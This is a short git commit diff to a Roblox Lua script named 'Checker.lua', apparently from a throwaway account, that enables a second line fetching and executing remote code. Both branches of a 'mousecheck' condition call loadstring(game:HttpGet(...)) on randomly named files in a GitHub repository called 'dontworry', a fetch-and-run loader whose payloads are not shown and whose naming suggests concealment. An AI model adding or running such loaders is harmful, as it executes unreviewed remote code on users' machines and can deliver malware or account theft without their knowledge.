9a2eeef25065809997a9de2a38dc056073d30c72
drgdrxgdxrhyxdrhedrhesrdherd <z64875421@gmail.com>
2025-03-25 01:19:38 +0300

    Update Checker.lua

--- Checker.lua
+++ Checker.lua
@@ -6,5 +6,5 @@ wait(1)
 if mousecheck then
       loadstring(game:HttpGet("https://raw.githubusercontent.com/drgdrxgdxrhyxdrhedrhesrdherd/dontworry/refs/heads/main/sfgszefeszf_k.lua"))()
 else
-      --loadstring(game:HttpGet("https://raw.githubusercontent.com/drgdrxgdxrhyxdrhedrhesrdherd/dontworry/refs/heads/main/mb.lua"))()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/drgdrxgdxrhyxdrhedrhesrdherd/dontworry/refs/heads/main/mb.lua"))()
 end
